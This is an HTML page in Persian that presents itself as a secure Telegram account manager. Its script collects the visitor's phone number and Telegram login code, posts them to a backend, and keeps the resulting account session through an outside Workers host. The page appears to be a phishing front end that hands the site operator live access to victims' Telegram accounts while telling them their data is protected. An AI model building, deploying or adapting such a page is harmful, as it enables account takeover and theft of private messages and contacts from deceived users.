<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>کنترل حساب کاربری تلگرام خود</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    /* استایل‌های قبلی بدون تغییر باقی می‌مانند */
    :root {
      --primary-color: #0088cc;
      --primary-dark: #006da3;
      --secondary-color: #25d366;
      --text-color: #333;
      --text-light: #666;
      --background: #f5f5f5;
      --white: #ffffff;
      --error: #f44336;
      --success: #4caf50;
      --warning: #ff9800;
      --border-radius: 12px;
      --box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #0088cc, #00a2ff);
      color: var(--text-color);
      direction: rtl;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    .container {
      width: 100%;
      max-width: 450px;
      margin: 0 auto;
    }

    .card {
      background: var(--white);
      border-radius: var(--border-radius);
      box-shadow: var(--box-shadow);
      padding: 30px;
      margin-bottom: 20px;
      transition: all 0.3s ease;
    }

    .welcome-card {
      text-align: center;
    }

    .logo {
      margin-bottom: 20px;
    }

    h1 {
      color: var(--primary-color);
      margin-bottom: 15px;
      font-size: 24px;
    }

    h2 {
      color: var(--primary-color);
      margin-bottom: 20px;
      font-size: 22px;
    }

    p {
      color: var(--text-light);
      margin-bottom: 20px;
      line-height: 1.6;
    }

    .features {
      text-align: right;
      margin: 25px 0;
    }

    .feature {
      display: flex;
      align-items: center;
      margin-bottom: 15px;
    }

    .feature i {
      color: var(--primary-color);
      margin-left: 10px;
      font-size: 20px;
    }

    .btn {
      display: inline-block;
      padding: 14px 28px;
      background-color: var(--primary-color);
      color: var(--white);
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 16px;
      font-weight: 600;
      text-align: center;
      transition: all 0.3s ease;
      width: 100%;
    }

    .btn:hover {
      background-color: var(--primary-dark);
      transform: translateY(-2px);
    }

    .btn:active {
      transform: translateY(0);
    }

    .btn-secondary {
      background-color: #f1f1f1;
      color: var(--text-color);
    }

    .btn-secondary:hover {
      background-color: #e5e5e5;
    }

    .btn-outline {
      background-color: transparent;
      border: 2px solid var(--primary-color);
      color: var(--primary-color);
    }

    .btn-outline:hover {
      background-color: var(--primary-color);
      color: var(--white);
    }

    .btn-small {
      padding: 10px 16px;
      font-size: 14px;
    }

    .input-group {
      margin: 20px 0;
    }

    label {
      display: block;
      margin-bottom: 8px;
      color: var(--text-light);
      font-weight: 500;
    }

    input {
      width: 100%;
      padding: 14px;
      border: 1px solid #ddd;
      border-radius: 8px;
      font-size: 16px;
      transition: border-color 0.3s;
    }

    input:focus {
      outline: none;
      border-color: var(--primary-color);
      box-shadow: 0 0 0 2px rgba(0, 136, 204, 0.2);
    }

    .timer {
      text-align: center;
      margin: 15px 0;
      font-size: 16px;
      color: var(--text-light);
    }

    .timer span {
      font-weight: bold;
      color: var(--primary-color);
    }

    .action-buttons {
      display: flex;
      gap: 10px;
      margin-top: 15px;
    }

    .action-buttons .btn {
      width: auto;
      flex: 1;
    }

    .hidden {
      display: none;
    }

    .status {
      margin-top: 20px;
      padding: 15px;
      border-radius: 8px;
      min-height: 20px;
      font-size: 14px;
    }

    .status.info {
      background-color: #e3f2fd;
      border-right: 4px solid #2196f3;
      color: #0d47a1;
    }

    .status.success {
      background-color: #e8f5e9;
      border-right: 4px solid var(--success);
      color: #2e7d32;
    }

    .status.error {
      background-color: #ffebee;
      border-right: 4px solid var(--error);
      color: #c62828;
    }

    .status.loading {
      background-color: #fff3e0;
      border-right: 4px solid var(--warning);
      color: #e65100;
    }

    .status.loading::after {
      content: "...";
      animation: dots 1.5s steps(4, end) infinite;
    }

    .user-info {
      margin-top: 20px;
    }

    .user-info-card {
      background-color: #f8f8f8;
      border-radius: 8px;
      padding: 20px;
      text-align: right;
    }

    .user-info h3 {
      color: var(--primary-color);
      margin-bottom: 15px;
      font-size: 20px;
      border-bottom: 1px solid #ddd;
      padding-bottom: 10px;
    }

    .info-row {
      display: flex;
      justify-content: space-between;
      margin: 12px 0;
      padding-bottom: 12px;
      border-bottom: 1px dashed #eee;
    }

    .info-label {
      color: var(--text-light);
      font-weight: 500;
    }

    .info-value {
      color: var(--text-color);
      font-weight: 600;
    }

    .dev-notice {
      margin-top: 20px;
      padding: 15px;
      background-color: #fff3cd;
      border-radius: 8px;
      color: #856404;
      border-right: 4px solid #ffc107;
    }

    .dashboard-actions {
      display: flex;
      gap: 10px;
      margin-top: 20px;
    }

    .dashboard-actions .btn {
      flex: 1;
    }

    @keyframes dots {
      0%, 20% { content: "."; }
      40% { content: ".."; }
      60%, 100% { content: "..."; }
    }

    /* حالت پاسخگویی برای موبایل */
    @media (max-width: 480px) {
      .card {
        padding: 20px;
      }
      
      h1 {
        font-size: 22px;
      }
      
      h2 {
        font-size: 20px;
      }
      
      .btn {
        padding: 12px 20px;
      }
      
      .action-buttons {
        flex-direction: column;
      }
      
      .dashboard-actions {
        flex-direction: column;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- صفحه خوش آمدگویی -->
    <div id="welcomeScreen" class="card welcome-card">
      <div class="logo">
        <svg width="80" height="80" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2Z" fill="#0088cc"/>
          <path d="M16.64 8.8C16.49 10.38 15.84 14.22 15.51 15.99C15.37 16.74 15.09 16.99 14.83 17.02C14.25 17.07 13.81 16.64 13.25 16.27C12.37 15.69 11.87 15.33 11.02 14.77C10.06 14.14 10.67 13.81 11.2 13.26C11.33 13.12 13.81 10.92 13.85 10.71C13.86 10.65 13.86 10.5 13.77 10.42C13.69 10.34 13.56 10.37 13.46 10.39C13.33 10.42 11.94 11.33 9.41 13.08C9 13.35 8.62 13.49 8.27 13.49C7.88 13.48 7.12 13.2 6.52 12.96C5.82 12.68 5.27 12.53 5.32 12.15C5.35 11.94 5.65 11.72 6.2 11.5C9.49 10.08 11.68 9.18 12.76 8.8C15.99 7.58 16.69 7.36 17.07 7.36C17.16 7.36 17.37 7.38 17.5 7.49C17.61 7.58 17.64 7.7 17.64 7.79C17.63 7.88 17.64 8.1 17.53 8.24C17.44 8.37 16.91 8.53 16.64 8.8Z" fill="white"/>
        </svg>
      </div>
      <h1>کنترل حساب کاربری تلگرام خود</h1>
      <p>با بهترین و پیشرفته‌ترین سیستم مدیریت حساب تلگرام، اطلاعات حساب خود را مشاهده و مدیریت کنید.</p>
      
      <div class="features">
        <div class="feature">
          <i class="fas fa-shield-alt"></i>
          <span>امنیت بالا و حفاظت از اطلاعات</span>
        </div>
        <div class="feature">
          <i class="fas fa-bolt"></i>
          <span>دسترسی سریع و آسان</span>
        </div>
        <div class="feature">
          <i class="fas fa-mobile-alt"></i>
          <span>سازگار با تمام دستگاه‌ها</span>
        </div>
      </div>
      
      <button id="startBtn" class="btn">
        شروع کنید
        <i class="fas fa-arrow-left" style="margin-right: 8px;"></i>
      </button>
    </div>

    <!-- صفحه وارد کردن شماره تلفن -->
    <div id="phoneScreen" class="card hidden">
      <h2>ورود به حساب کاربری</h2>
      <p>لطفاً شماره تلفن همراه خود را وارد کنید</p>
      
      <div class="input-group">
        <label for="phone">شماره تلفن</label>
        <input id="phone" type="tel" placeholder="مثال: +989123456789" />
      </div>

      <button id="sendPhone" class="btn">ارسال کد تایید</button>
      
      <div id="phoneStatus" class="status info">لطفاً شماره تلفن معتبر وارد کنید</div>
    </div>

    <!-- صفحه وارد کردن کد تایید -->
    <div id="codeScreen" class="card hidden">
      <h2>تایید شماره تلفن</h2>
      <p>کد تأیید ارسال شده به شماره <span id="phoneNumber"></span> را وارد کنید</p>
      
      <div class="input-group">
        <label for="code">کد تأیید</label>
        <input id="code" type="text" placeholder="کد ۵ رقمی" maxlength="5" />
      </div>

      <div class="timer">
        زمان باقی‌مانده: <span id="countdown">60</span> ثانیه
      </div>

      <button id="sendCode" class="btn">تایید و ادامه</button>
      
      <div class="action-buttons">
        <button id="resendCode" class="btn btn-outline btn-small" disabled>
          ارسال مجدد کد
        </button>
        <button id="editPhone" class="btn btn-secondary btn-small">
          <i class="fas fa-edit"></i> ویرایش شماره
        </button>
      </div>
      
      <div id="codeStatus" class="status"></div>
    </div>

    <!-- صفحه اطلاعات کاربر -->
    <div id="userScreen" class="card hidden">
      <h2>اطلاعات حساب کاربری</h2>
      <p>مشخصات حساب تلگرام شما با موفقیت دریافت شد</p>
      
      <div class="user-info-card">
        <h3>مشخصات کاربر</h3>
        <div class="info-row">
          <span class="info-label">نام:</span>
          <span id="userFirstName" class="info-value">در حال بارگذاری...</span>
        </div>
        <div class="info-row">
          <span class="info-label">نام خانوادگی:</span>
          <span id="userLastName" class="info-value">در حال بارگذاری...</span>
        </div>
        <div class="info-row">
          <span class="info-label">نام کاربری:</span>
          <span id="userUsername" class="info-value">در حال بارگذاری...</span>
        </div>
        <div class="info-row">
          <span class="info-label">شماره تلفن:</span>
          <span id="userPhone" class="info-value">در حال بارگذاری...</span>
        </div>
        <div class="info-row">
          <span class="info-label">آی‌دی عددی:</span>
          <span id="userId" class="info-value">در حال بارگذاری...</span>
        </div>
      </div>
      
      <div class="dashboard-actions">
        <button id="refreshBtn" class="btn btn-outline">
          <i class="fas fa-sync-alt"></i> بروزرسانی اطلاعات
        </button>
        <button id="logoutBtn" class="btn btn-secondary">
          <i class="fas fa-sign-out-alt"></i> خروج
        </button>
      </div>
      
      <div class="dev-notice">
        <strong><i class="fas fa-info-circle"></i> توجه:</strong> این سایت در حال توسعه می‌باشد. اطلاعات نمایش داده شده فقط برای تست هستند.
      </div>
      
      <div id="userStatus" class="status success">شما با موفقیت وارد شدید!</div>
    </div>
  </div>

  <script>
    // متغیرهای global
    let phoneCodeHash = '';
    let currentPhone = '';
    let countdownTimer;
    let timeLeft = 60;
    let currentSessionId = localStorage.getItem('telegram_session_id');

    // عناصر DOM
    const welcomeScreen = document.getElementById('welcomeScreen');
    const phoneScreen = document.getElementById('phoneScreen');
    const codeScreen = document.getElementById('codeScreen');
    const userScreen = document.getElementById('userScreen');
    
    const startBtn = document.getElementById('startBtn');
    const sendPhoneBtn = document.getElementById('sendPhone');
    const sendCodeBtn = document.getElementById('sendCode');
    const resendCodeBtn = document.getElementById('resendCode');
    const editPhoneBtn = document.getElementById('editPhone');
    const refreshBtn = document.getElementById('refreshBtn');
    const logoutBtn = document.getElementById('logoutBtn');
    
    const phoneInput = document.getElementById('phone');
    const codeInput = document.getElementById('code');
    const phoneNumberSpan = document.getElementById('phoneNumber');
    const countdownSpan = document.getElementById('countdown');
    
    const phoneStatus = document.getElementById('phoneStatus');
    const codeStatus = document.getElementById('codeStatus');
    const userStatus = document.getElementById('userStatus');

    // مدیریت رویدادها
    startBtn.addEventListener('click', showPhoneScreen);
    sendPhoneBtn.addEventListener('click', sendPhoneNumber);
    sendCodeBtn.addEventListener('click', verifyCode);
    resendCodeBtn.addEventListener('click', resendCode);
    editPhoneBtn.addEventListener('click', editPhoneNumber);
    refreshBtn.addEventListener('click', refreshUserInfo);
    logoutBtn.addEventListener('click', logout);
    
    phoneInput.addEventListener('keypress', function(e) {
      if (e.key === 'Enter') sendPhoneNumber();
    });
    
    codeInput.addEventListener('keypress', function(e) {
      if (e.key === 'Enter') verifyCode();
    });

    // بررسی session هنگام بارگذاری صفحه
    document.addEventListener('DOMContentLoaded', function() {
      if (currentSessionId) {
        checkSession(currentSessionId);
      }
    });

    // بررسی session
    async function checkSession(sessionId) {
      showStatus(userStatus, "در حال بررسی session...", "loading");
      
      try {
        const response = await fetch('https://tell.a09627301.workers.dev/api/check-session', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ sessionId }),
        });
        
        const data = await response.json();
        
        if (data.success) {
          displayUserInfo(data.user);
          welcomeScreen.classList.add('hidden');
          userScreen.classList.remove('hidden');
          showStatus(userStatus, "خوش آمدید! اطلاعات شما با موفقیت بارگذاری شد.", "success");
          currentSessionId = data.sessionId;
          localStorage.setItem('telegram_session_id', data.sessionId);
        } else {
          localStorage.removeItem('telegram_session_id');
          currentSessionId = null;
        }
      } catch (error) {
        console.error('Session check error:', error);
        localStorage.removeItem('telegram_session_id');
        currentSessionId = null;
      }
    }

    // توابع نمایش صفحات
    function showPhoneScreen() {
      welcomeScreen.classList.add('hidden');
      phoneScreen.classList.remove('hidden');
    }
    
    function showCodeScreen() {
      phoneScreen.classList.add('hidden');
      codeScreen.classList.remove('hidden');
      phoneNumberSpan.textContent = currentPhone;
      startTimer();
    }
    
    function showUserScreen() {
      codeScreen.classList.add('hidden');
      userScreen.classList.remove('hidden');
    }
    
    function editPhoneNumber() {
      clearInterval(countdownTimer);
      codeScreen.classList.add('hidden');
      phoneScreen.classList.remove('hidden');
      codeInput.value = '';
    }

    // تایمر برای ارسال مجدد کد
    function startTimer() {
      timeLeft = 60;
      countdownSpan.textContent = timeLeft;
      resendCodeBtn.disabled = true;
      
      clearInterval(countdownTimer);
      countdownTimer = setInterval(() => {
        timeLeft--;
        countdownSpan.textContent = timeLeft;
        
        if (timeLeft <= 0) {
          clearInterval(countdownTimer);
          resendCodeBtn.disabled = false;
        }
      }, 1000);
    }

    // ارسال شماره تلفن
    async function sendPhoneNumber() {
      const phone = phoneInput.value.trim();
      
      if (!phone) {
        showStatus(phoneStatus, "لطفاً شماره تلفن را وارد کنید", "error");
        return;
      }
      
      currentPhone = phone;
      showStatus(phoneStatus, "در حال ارسال درخواست...", "loading");
      
      try {
        const response = await fetch('/api/login', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            step: "sendCode",
            phone: phone
          }),
        });
        
        const data = await response.json();
        
        if (data.success) {
          phoneCodeHash = data.phoneCodeHash;
          showStatus(phoneStatus, "کد تأیید ارسال شد", "success");
          showCodeScreen();
        } else {
          showStatus(phoneStatus, data.message, "error");
        }
      } catch (error) {
        console.error('Error sending phone:', error);
        showStatus(phoneStatus, "خطا در ارسال درخواست. لطفاً دوباره امتحان کنید.", "error");
      }
    }

    // ارسال مجدد کد
    async function resendCode() {
      showStatus(codeStatus, "در حال ارسال مجدد کد...", "loading");
      
      try {
        const response = await fetch('/api/login', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            step: "sendCode",
            phone: currentPhone
          }),
        });
        
        const data = await response.json();
        
        if (data.success) {
          phoneCodeHash = data.phoneCodeHash;
          showStatus(codeStatus, "کد تأیید مجدداً ارسال شد", "success");
          startTimer();
        } else {
          showStatus(codeStatus, data.message, "error");
        }
      } catch (error) {
        console.error('Error resending code:', error);
        showStatus(codeStatus, "خطا در ارسال مجدد کد. لطفاً دوباره امتحان کنید.", "error");
      }
    }

    // تأیید کد
    async function verifyCode() {
      const code = codeInput.value.trim();
      
      if (!code) {
        showStatus(codeStatus, "لطفاً کد تأیید را وارد کنید", "error");
        return;
      }
      
      showStatus(codeStatus, "در حال تأیید کد...", "loading");
      
      try {
        const response = await fetch('/api/login', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            step: "verifyCode",
            phone: currentPhone,
            code: code,
            phoneCodeHash: phoneCodeHash
          }),
        });
        
        const data = await response.json();
        
        if (data.success) {
          clearInterval(countdownTimer);
          
          // ذخیره sessionId در localStorage
          if (data.sessionId) {
            localStorage.setItem('telegram_session_id', data.sessionId);
            currentSessionId = data.sessionId;
          }
          
          displayUserInfo(data.user);
          showUserScreen();
          showStatus(codeStatus, "کد با موفقیت تأیید شد", "success");
        } else {
          showStatus(codeStatus, data.message, "error");
        }
      } catch (error) {
        console.error('Error verifying code:', error);
        showStatus(codeStatus, "خطا در تأیید کد. لطفاً دوباره امتحان کنید.", "error");
      }
    }

    // نمایش اطلاعات کاربر
    function displayUserInfo(user) {
      document.getElementById('userFirstName').textContent = user.firstName || 'تعیین نشده';
      document.getElementById('userLastName').textContent = user.lastName || 'تعیین نشده';
      document.getElementById('userUsername').textContent = user.username || 'تعیین نشده';
      document.getElementById('userPhone').textContent = user.phone || currentPhone;
      document.getElementById('userId').textContent = user.id || 'تعیین نشده';
    }

    // بروزرسانی اطلاعات کاربر
    async function refreshUserInfo() {
      if (!currentSessionId) {
        showStatus(userStatus, "ابتدا باید وارد شوید", "error");
        return;
      }
      
      showStatus(userStatus, "در حال بروزرسانی اطلاعات...", "loading");
      
      try {
        const response = await fetch('https://tell.a09627301.workers.dev/api/check-session', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ sessionId: currentSessionId }),
        });
        
        const data = await response.json();
        
        if (data.success) {
          displayUserInfo(data.user);
          showStatus(userStatus, "اطلاعات با موفقیت بروزرسانی شد", "success");
        } else {
          showStatus(userStatus, data.message, "error");
        }
      } catch (error) {
        console.error('Error refreshing user info:', error);
        showStatus(userStatus, "خطا در بروزرسانی اطلاعات. لطفاً دوباره امتحان کنید.", "error");
      }
    }

    // خروج از حساب
    async function logout() {
      if (!currentSessionId) {
        showStatus(userStatus, "شما وارد نشده‌اید", "error");
        return;
      }
      
      showStatus(userStatus, "در حال خروج...", "loading");
      
      try {
        const response = await fetch('https://tell.a09627301.workers.dev/api/logout', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ sessionId: currentSessionId }),
        });
        
        const data = await response.json();
        
        if (data.success) {
          localStorage.removeItem('telegram_session_id');
          currentSessionId = null;
          userScreen.classList.add('hidden');
          welcomeScreen.classList.remove('hidden');
        } else {
          showStatus(userStatus, data.message, "error");
        }
      } catch (error) {
        console.error('Error logging out:', error);
        showStatus(userStatus, "خطا در خروج. لطفاً دوباره امتحان کنید.", "error");
      }
    }

    // نمایش وضعیت
    function showStatus(element, message, type) {
      element.textContent = message;
      element.className = 'status';
      
      if (type === 'info') element.classList.add('info');
      else if (type === 'success') element.classList.add('success');
      else if (type === 'error') element.classList.add('error');
      else if (type === 'loading') element.classList.add('loading');
    }
  </script>
</body>
</html>
